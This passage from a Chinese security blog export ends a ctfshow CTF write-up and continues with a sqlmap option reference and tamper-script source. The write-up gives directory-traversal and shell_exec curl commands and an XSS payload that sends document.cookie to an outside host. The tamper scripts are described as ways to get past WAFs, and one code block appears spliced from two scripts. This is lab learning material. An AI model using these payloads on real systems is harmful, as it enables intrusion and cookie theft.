class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="literal">true</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;flag_660&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$auth</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth&#x27;</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$auth</span>==AUTH_KEY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span>  FLAG_657;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testFile</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$f</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">random_int</span>(<span class="number">1</span>,<span class="number">10000</span>)).<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">random_int</span>(<span class="number">1</span>,<span class="number">10000</span>))).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">		<span class="variable">$result</span> = FLAG_658;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">	<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;数据获取失败&#x27;</span>,</span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]==<span class="literal">true</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">switch</span> (<span class="variable">$m</span>) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;getFlag&#x27;</span>:</span><br><span class="line">				<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;testFile&#x27;</span>:</span><br><span class="line">				<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">testFile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="comment"># code...</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;请先登陆&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后来环境重开了，网段改变了，注意一下</p>
<p>存在目录穿越漏洞</p>
<p><img src="/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230601170949.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key=key_is_here_you_know&amp;file=../db/data_you_never_know.db&amp;1=echo shell_exec(&#x27;curl http://172.2.132.5/public../FLAG/flag659.txt&#x27;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;73c4213829f8b393b2082bacb4253cab&#125; </span><br></pre></td></tr></table></figure>

<p>访问日志文件，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=echo shell_exec(&#x27;curl http://172.2.238.5/public../var/log/nginx/</span><br><span class="line">ctfshow_web_access_log_file_you_never_know.log&#x27;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_660_ctfshow&#123;23e56d95b430de80c7b5806f49a14a2b&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?action=login&amp;u=admin&amp;p=nE7jA5m&amp;flag=flag_660_ctfshow&#123;23e56d95b430de80c7b5806f49a14a2b&#125;</span><br></pre></td></tr></table></figure>

<p>剩下的学习一下，再写吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=echo `curl http://172.2.121.5:8888`;</span><br></pre></td></tr></table></figure>

<p>xss </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=echo `curl  --header &quot;X-Forwarded-For:&lt;script&gt;window.location.href=\&quot;http://172.2.26.4:80/system36d/util/a.php?a=\&quot;+document.cookie&lt;/script&gt;&quot; http://172.2.26.5:80/index.php?action=login&amp;u=1&amp;p=2`;</span><br></pre></td></tr></table></figure>



<h1 id="资产梳理"><a href="#资产梳理" class="headerlink" title="资产梳理"></a>资产梳理</h1>]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmaptamper</title>
    <url>/2024/04/02/sqlmaptamper/</url>
    <content><![CDATA[<p>sqlmap 详解</p>
<!--mroe-->

<h1 id="sqlmap-指令"><a href="#sqlmap-指令" class="headerlink" title="sqlmap 指令"></a>sqlmap 指令</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap常用命令</span><br><span class="line">-h                                           显示基本帮助信息</span><br><span class="line"></span><br><span class="line">-hh                                         显示高级帮助信息</span><br><span class="line"></span><br><span class="line">--version                                显示版本号</span><br><span class="line"></span><br><span class="line">-v                                           详细等级（0-6 默认 1）</span><br><span class="line"></span><br><span class="line">                                              0：只显示python错误以及重要信息</span><br><span class="line"></span><br><span class="line">                                              1：显示信息以及警告</span><br><span class="line"></span><br><span class="line">                                              2：显示debug消息</span><br><span class="line"></span><br><span class="line">                                              3：显示注入payload</span><br><span class="line"></span><br><span class="line">                                              4：显示http请求</span><br><span class="line"></span><br><span class="line">                                              5：显示http响应头·</span><br><span class="line"></span><br><span class="line">                                              6：显示http响应内容</span><br><span class="line"></span><br><span class="line">Target：                                </span><br><span class="line"></span><br><span class="line">-u                                          指定目标url</span><br><span class="line"></span><br><span class="line">-d                                          直接连接数据库</span><br><span class="line"></span><br><span class="line">-l                                           从burp代理日志的解析目标</span><br><span class="line"></span><br><span class="line">-r                                           从文件中加载http请求</span><br><span class="line"></span><br><span class="line">-g                                          从google dork的结果作为目标url</span><br><span class="line"></span><br><span class="line">-c                                          从INI配置文件中加载选项</span><br><span class="line"></span><br><span class="line">Request</span><br><span class="line"></span><br><span class="line">-A                                         指定user-agent头</span><br><span class="line"></span><br><span class="line">-H                                         额外的header</span><br><span class="line"></span><br><span class="line">-method=                              指定HTTP方法（GET/POST）</span><br><span class="line"></span><br><span class="line">--data=                                 通过POST提交数据    </span><br><span class="line"></span><br><span class="line">--param-del=                        指定参数分隔符</span><br><span class="line"></span><br><span class="line">--cookie=                              指定cookie的值</span><br><span class="line"></span><br><span class="line">--cookie-del=                        指定cookie分隔符</span><br><span class="line"></span><br><span class="line">--drop-set-cookie                  扔掉response中的set-cookie头</span><br><span class="line"></span><br><span class="line">--random-agent                    使用随机的user-agent头</span><br><span class="line"></span><br><span class="line">--host=                                  设置host头 </span><br><span class="line"></span><br><span class="line">--referer=                              指定referer头</span><br><span class="line"></span><br><span class="line">--headers=                            额外的headers</span><br><span class="line"></span><br><span class="line">--auth-type=                          http认证类型（Basic，NTLM，Digest）</span><br><span class="line"></span><br><span class="line">--auith-cred=                         http认证凭证（账号：密码）</span><br><span class="line"></span><br><span class="line">--ignore-proxy                       忽略系统代理（常用于扫描本地文件）</span><br><span class="line"></span><br><span class="line">--proxy=                                使用代理</span><br><span class="line"></span><br><span class="line">--proxy-cred=                        代理认证证书（账号：密码）</span><br><span class="line"></span><br><span class="line">--delay=                                 设置延迟时间（两个请求之间）</span><br><span class="line"></span><br><span class="line">--timeout=                              超时时来连接前等待（默认 30）</span><br><span class="line"></span><br><span class="line">--retries=                                连接超时时重试次数（默认 3）</span><br><span class="line"></span><br><span class="line">--randomize=                         随机更改指定的参数的值</span><br><span class="line"></span><br><span class="line">--safe-url=                             在测试期间经常访问的URL</span><br><span class="line"></span><br><span class="line">--safe-post=                           POST数据发送到安全的URL</span><br><span class="line"></span><br><span class="line">--safe-freq=                           两次请求之间穿插一个安全的URL   </span><br><span class="line"></span><br><span class="line">--skip-urlencode                    跳过payload数据的URL编码</span><br><span class="line"></span><br><span class="line">--chunked                             使用HTTP分块传输加密POST请求</span><br><span class="line"></span><br><span class="line">--hpp                                    使用HTTP参数pollution方法（常用于绕过IPS/IDS检测）</span><br><span class="line"></span><br><span class="line">--force-ssl                             强制使用SSL/HTTPS</span><br><span class="line"></span><br><span class="line">--eval=value                         请求之前提供Python代码（eg：&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;）</span><br><span class="line"></span><br><span class="line">Optimization</span><br><span class="line"></span><br><span class="line">-o                                         打开所有优化开关</span><br><span class="line"></span><br><span class="line">--predict-output                   预测输出（与--threads不兼容）</span><br><span class="line"></span><br><span class="line">--keep-alive                         建立长久的HTTP(S)连接 (与--proxy不兼容)</span><br><span class="line"></span><br><span class="line">--null-connection                 空连接</span><br><span class="line"></span><br><span class="line">--threads=value                  设置线程(默认 1)</span><br><span class="line"></span><br><span class="line">Injection</span><br><span class="line"></span><br><span class="line">-p                                       指定测试参数</span><br><span class="line"></span><br><span class="line">--skip=                               跳过指定参数的测试</span><br><span class="line"></span><br><span class="line">--skip-static                        跳过测试静态的参数</span><br><span class="line"></span><br><span class="line">--dbms=                             指定具体DBMS</span><br><span class="line"></span><br><span class="line">--os=                                  指定DBMS操作系统</span><br><span class="line"></span><br><span class="line">--invalid-bignum                使用大数字使值无效</span><br><span class="line"></span><br><span class="line">--invalid-logical                  使用逻辑符使值无效</span><br><span class="line"></span><br><span class="line">--invalid-string                   使用字符串使值无效</span><br><span class="line"></span><br><span class="line">--no-cast                             关闭payload铸造机制</span><br><span class="line"></span><br><span class="line">--no-escape                       关闭字符转义机制（默认自动开启）</span><br><span class="line"></span><br><span class="line">--prefix=                             加入payload前缀</span><br><span class="line"></span><br><span class="line">--suffix=                              加入payload后缀</span><br><span class="line"></span><br><span class="line">--tamper=                          指定使用的脚本</span><br><span class="line"></span><br><span class="line">Detectiong</span><br><span class="line"></span><br><span class="line">--level=                              指定测试的等级（1-5 默认为1）</span><br><span class="line"></span><br><span class="line">--risk=                               指定测试的风险（0-3 默认为1）</span><br><span class="line"></span><br><span class="line">--string=                            登录成功时，页面所含有的“关键字” 用于证明已经登录成功</span><br><span class="line"></span><br><span class="line">--not-string=                      登录成功时，页面所含有的“关键字” 用于证明已经登录失败</span><br><span class="line"></span><br><span class="line">--code=                             查询为真时，匹配的HTTP代码</span><br><span class="line"></span><br><span class="line">--smart                              当有大量检测目标时，只选择基于错误的检测结果</span><br><span class="line"></span><br><span class="line">--text-only                         仅基于文本内容比较网页</span><br><span class="line"></span><br><span class="line">--titles                               仅基于标题比较网页</span><br><span class="line"></span><br><span class="line">Techniques</span><br><span class="line"></span><br><span class="line">--technique=                      指定sql注入技术（默认BEUSTQ）</span><br><span class="line"></span><br><span class="line">--time-sec=                        基于时间注入检测相应的延迟时间（默认为5秒）</span><br><span class="line"></span><br><span class="line">--union-clos=                     进行查询时，指定列的范围</span><br><span class="line"></span><br><span class="line">--union-char=                    指定暴力破解列数的字符</span><br><span class="line"></span><br><span class="line">Fingerprint</span><br><span class="line"></span><br><span class="line">-f                                      查询目标DBMS版本指纹信息</span><br><span class="line"></span><br><span class="line">Emuneration</span><br><span class="line"></span><br><span class="line">-a                                    查询所有  </span><br><span class="line"></span><br><span class="line">-b                                    查询目标DBMS banner信息</span><br><span class="line"></span><br><span class="line">--current-user                 查询目标DBMS当前用户</span><br><span class="line"></span><br><span class="line">--current-db                    查询目标DBMS当前数据库</span><br><span class="line"></span><br><span class="line">--is-dba                          查询目标DBMS当前用户是否为DBA</span><br><span class="line"></span><br><span class="line">--users                            枚举目标DBMS所有的用户</span><br><span class="line"></span><br><span class="line">--paswords                     枚举目标DBMS用户密码哈希值</span><br><span class="line"></span><br><span class="line">--privileges                     枚举目标DBMS用户的权限</span><br><span class="line"></span><br><span class="line">--roles                            枚举DBMS用户的角色</span><br><span class="line"></span><br><span class="line">--dbs                              枚举DBMS所有的数据库</span><br><span class="line"></span><br><span class="line">--tables                          枚举DBMS数据库中所有的表</span><br><span class="line"></span><br><span class="line">--columns                      枚举DBMS数据库表中所有的列</span><br><span class="line"></span><br><span class="line">--count                         检索表的条目的数量</span><br><span class="line"></span><br><span class="line">--dump                         存储DBMS数据库的表中的条目</span><br><span class="line"></span><br><span class="line">--dump-all                     存储DBMS所有数据库表中的条目</span><br><span class="line"></span><br><span class="line">--D db                          指定进行枚举的数据库名称</span><br><span class="line"></span><br><span class="line">--T   table                     指定进行枚举的数据库表名称</span><br><span class="line"></span><br><span class="line">--C   column                 指定进行枚举的数据库列名称</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs          枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--sql-query                    指定查询的sql语句</span><br><span class="line"></span><br><span class="line">--sql-shell                     提示输入一个交互式sql shell</span><br><span class="line"></span><br><span class="line">Brute force</span><br><span class="line"></span><br><span class="line">--common-tables                       暴力破解表 </span><br><span class="line"></span><br><span class="line">--common-colomns                    暴力破解列</span><br><span class="line"></span><br><span class="line">File system access</span><br><span class="line"></span><br><span class="line">--file-read                            从目标数据库管理文件系统读取文件</span><br><span class="line"></span><br><span class="line">--file-write                           上传文件到目标数据库管理文件系统</span><br><span class="line"></span><br><span class="line">--file-dest                             指定写入文件的绝对路径</span><br><span class="line"></span><br><span class="line">--os-cmd=                           执行操作系统命令</span><br><span class="line"></span><br><span class="line">--os-shell                            交互式的系统shell</span><br><span class="line"></span><br><span class="line">--os-pwn                             获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line"></span><br><span class="line">--os-smbrelay                    一键 获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line"></span><br><span class="line">--os-bof                              储存过程缓冲区溢出利用</span><br><span class="line"></span><br><span class="line">--os-esc                              数据库进程用户权限提升</span><br><span class="line"></span><br><span class="line">--msf-path=                        Metasploit  Framework本地安装路径</span><br><span class="line"></span><br><span class="line">General</span><br><span class="line"></span><br><span class="line">-s                                     sqlite会话文件保存位置</span><br><span class="line"></span><br><span class="line">-t                                      记录所有HTTP流量到指定文件中</span><br><span class="line"></span><br><span class="line">--batch                             测试过程中， 执行所有默认配置</span><br><span class="line"></span><br><span class="line">--charset=v                      强制用于数据检索的字符编码 </span><br><span class="line"></span><br><span class="line">--crawl=                           从目标URL开始爬取网站</span><br><span class="line"></span><br><span class="line">--crawl-exclude=              禁止爬取某个页面（eg：logout）</span><br><span class="line"></span><br><span class="line">--csv-del=                        指定CSV输出中使用的的字符</span><br><span class="line"></span><br><span class="line">--dump-format=               储存数据的方式（CSV(default)，HTML，SQLITE）</span><br><span class="line"></span><br><span class="line">--flush-session                 刷新当前目标的会话文件</span><br><span class="line"></span><br><span class="line">--fresh-queries                 忽略会话文件中储存的查询结果，重新查询</span><br><span class="line"></span><br><span class="line">--hex                                使用DBMS hex函数进行数据检索</span><br><span class="line"></span><br><span class="line">--outpout-dir=                  自定义输出目录</span><br><span class="line"></span><br><span class="line">--save=                            保存选项到INI配置文件中</span><br><span class="line"></span><br><span class="line">--scope=                          使用正则表达式从提供的日志中guo&#x27;l</span><br><span class="line"></span><br><span class="line">--alert                               再找到SQL注入时运行主机操作系统命令</span><br><span class="line"></span><br><span class="line">--purge-output                  安全的从输出目录中删除所有内容</span><br><span class="line"></span><br><span class="line">--sqlmap-shell                  提示输入交互式sqlmap  shell</span><br><span class="line"></span><br><span class="line">--update                           更新sqlmap</span><br><span class="line"></span><br><span class="line">sqlmap注入技术简介</span><br><span class="line">--technique=     （默认全部使用）</span><br><span class="line"></span><br><span class="line">B       基于布尔的盲注</span><br><span class="line"></span><br><span class="line">T       基于时间的盲注</span><br><span class="line"></span><br><span class="line">E      基于报错的注入</span><br><span class="line"></span><br><span class="line">U      基于UNION查询注入</span><br><span class="line"></span><br><span class="line">S      基于多语句查询注入</span><br><span class="line"></span><br><span class="line">sqlmap获取目标方式</span><br><span class="line">1.指定目标url</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br><span class="line"></span><br><span class="line">2.从文件中获取多个url</span><br><span class="line"></span><br><span class="line">sqlmap -m 1.txt</span><br><span class="line">3.从文件中加载HTTP请求</span><br><span class="line">sqlmap -r  url.txt</span><br></pre></td></tr></table></figure>

<h1 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="sqlmap-脚本详解"><a href="#sqlmap-脚本详解" class="headerlink" title="sqlmap 脚本详解"></a>sqlmap 脚本详解</h1><h2 id="0eunion"><a href="#0eunion" class="headerlink" title="0eunion"></a>0eunion</h2><p>作用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.HIGHEST</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces instances of &lt;int&gt; UNION with &lt;int&gt;e0UNION</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Requirement:</span></span><br><span class="line"><span class="string">        * MySQL</span></span><br><span class="line"><span class="string">        * MsSQL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;1 UNION ALL SELECT&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;1e0UNION ALL SELECT&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r&quot;(?i)(\d+)\s+(UNION )&quot;</span>, <span class="string">r&quot;\g&lt;1&gt;e0\g&lt;2&gt;&quot;</span>, payload) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br></pre></td></tr></table></figure>



<h2 id="apostrophemask"><a href="#apostrophemask" class="headerlink" title="apostrophemask"></a>apostrophemask</h2><p>把’使用%EF%BC%87进行替换【类似款字节】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces apostrophe character with its UTF-8 full width counterpart</span><br><span class="line"> </span><br><span class="line">    References:</span><br><span class="line">        * http://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&amp;number=128</span><br><span class="line">        * http://lukasz.pilorz.net/testy/unicode_conversion/</span><br><span class="line">        * http://sla.ckers.org/forum/read.php?13,11562,11850</span><br><span class="line">        * http://lukasz.pilorz.net/testy/full_width_utf/index.phps</span><br><span class="line"> </span><br><span class="line">    &gt;&gt;&gt; tamper(&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;)</span><br><span class="line">    &#x27;1 AND %EF%BC%871%EF%BC%87=%EF%BC%871&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">    return payload.replace(&#x27;\&#x27;&#x27;, &quot;%EF%BC%87&quot;) if payload else payload</span><br></pre></td></tr></table></figure>

<h2 id="apostrophenullencode"><a href="#apostrophenullencode" class="headerlink" title="apostrophenullencode"></a>apostrophenullencode</h2><p>将‘使用%00%27进行替换。中间增加%00</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces apostrophe character with its illegal double unicode counterpart</span><br><span class="line"> </span><br><span class="line">    &gt;&gt;&gt; tamper(&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;)</span><br><span class="line">    &#x27;1 AND %00%271%00%27=%00%271&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">    return payload.replace(&#x27;\&#x27;&#x27;, &quot;%00%27&quot;) if payload else payload</span><br></pre></td></tr></table></figure>

<p>3.appendnullbyte 主要表现为在每行的最后增加一个%00</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Appends encoded NULL byte character at the end of payload</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * Microsoft Access</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak web application firewalls when the back-end</span><br><span class="line">          database management system is Microsoft Access - further uses are</span><br><span class="line">          also possible</span><br><span class="line"></span><br><span class="line">    Reference: http://projects.webappsec.org/w/page/13246949/Null-Byte-Injection</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND 1=1&#x27;)</span><br><span class="line">    &#x27;1 AND 1=1%00&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    return &quot;%s%%00&quot; % payload if payload else payload</span><br></pre></td></tr></table></figure>

<p>4.base64encode 主要对当前的url进行base64编码达到传递的目的(针对使用bas6e传输的)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Base64 all characters in a given payload</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&quot;1&#x27; AND SLEEP(5)#&quot;)</span><br><span class="line">    &#x27;MScgQU5EIFNMRUVQKDUpIw==&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>5.between 主要是替换一些使用 &gt; &#x3D; &lt; 进行匹配的时候使用between来进行替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces greater than operator (&#x27;&gt;&#x27;) with &#x27;NOT BETWEEN 0 AND #&#x27;</span><br><span class="line">    Replaces equals operator (&#x27;=&#x27;) with &#x27;BETWEEN # AND #&#x27;</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak and bespoke web application firewalls that</span><br><span class="line">          filter the greater than character</span><br><span class="line">        * The BETWEEN clause is SQL standard. Hence, this tamper script</span><br><span class="line">          should work against all (?) databases</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND A &gt; B--&#x27;)</span><br><span class="line">    &#x27;1 AND A NOT BETWEEN 0 AND B--&#x27;</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;1 AND A = B--&#x27;)</span><br><span class="line">    &#x27;1 AND A BETWEEN B AND B--&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        match = re.search(r&quot;(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^&gt;]+?)\s*&gt;\s*([^&gt;]+)\s*\Z&quot;, payload)</span><br><span class="line"></span><br><span class="line">        if match:</span><br><span class="line">            _ = &quot;%s %s NOT BETWEEN 0 AND %s&quot; % (match.group(2), match.group(4), match.group(5))</span><br><span class="line">            retVal = retVal.replace(match.group(0), _)</span><br><span class="line">        else:</span><br><span class="line">            retVal = re.sub(r&quot;\s*&gt;\s*(\d+|&#x27;[^&#x27;]+&#x27;|\w+\(\d+\))&quot;, &quot; NOT BETWEEN 0 AND \g&lt;1&gt;&quot;, payload)</span><br><span class="line"></span><br><span class="line">        if retVal == payload:</span><br><span class="line">            match = re.search(r&quot;(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^=]+?)\s*=\s*(\w+)\s*&quot;, payload)</span><br><span class="line"></span><br><span class="line">            if match:</span><br><span class="line">                _ = &quot;%s %s BETWEEN %s AND %s&quot; % (match.group(2), match.group(4), match.group(5), match.group(5))</span><br><span class="line">                retVal = retVal.replace(match.group(0), _)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br><span class="line">    return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload</span><br></pre></td></tr></table></figure>

<p>6.bluecoat 针对mysql的编码，再每个空格前使用%09来达到编码的目的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character after SQL statement with a valid random blank character.</span><br><span class="line">    Afterwards replace character = with LIKE operator</span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * Blue Coat SGOS with WAF activated as documented in</span><br><span class="line">        https://kb.bluecoat.com/index?page=content&amp;id=FAQ2147</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 5.1, SGOS</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass Blue Coat&#x27;s recommended WAF rule configuration</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users WHERE id = 1&#x27;)</span><br><span class="line">    &#x27;SELECT%09id FROM%09users WHERE%09id LIKE 1&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def process(match):</span><br><span class="line">        word = match.group(&#x27;word&#x27;)</span><br><span class="line">        if word.upper() in kb.keywords:</span><br><span class="line">            return match.group().replace(word, &quot;%s%%09&quot; % word)</span><br><span class="line">        else:</span><br><span class="line">            return match.group()</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = re.sub(r&quot;\b(?P&lt;word&gt;[A-Z_]+)(?=[^\w(]|\Z)&quot;, lambda match: process(match), retVal)</span><br><span class="line">        retVal = re.sub(r&quot;\s*=\s*&quot;, &quot; LIKE &quot;, retVal)</span><br><span class="line">        retVal = retVal.replace(&quot;%09 &quot;, &quot;%09&quot;)</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>7.chardoubleencode 对整个进行二次URL编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Double url-encodes all characters in a given payload (not processing</span><br><span class="line">    already encoded)</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass some weak web application firewalls that do not</span><br><span class="line">          double url-decode the request before processing it through their</span><br><span class="line">          ruleset</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT FIELD FROM%20TABLE&#x27;)</span><br><span class="line">    &#x27;%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        i = 0</span><br><span class="line"></span><br><span class="line">        while i &lt; len(payload):</span><br><span class="line">            if payload[i] == &#x27;%&#x27; and (i &lt; len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in 